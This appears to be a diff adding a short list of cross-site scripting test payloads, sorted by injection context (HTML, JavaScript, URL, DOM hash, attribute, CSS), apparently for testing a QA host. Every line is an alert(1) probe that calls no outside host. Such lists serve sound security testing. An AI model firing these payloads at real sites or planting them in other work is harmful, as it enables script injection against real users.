@@ -1,0 +1,13 @@
+# Context-specific XSS payloads
+# HTML context
+"><img src=x onerror=alert(1)>
+# JavaScript context
+';alert(1);'
+# URL context
+javascript:alert(1)
+# DOM source from hash
+https://app.qa.local/#<img src=x onerror=alert(1)>
+# Attribute context
+" onfocus=alert(1) autofocus="
+# CSS context
+<div style="background:url('javascript:alert(1)')">
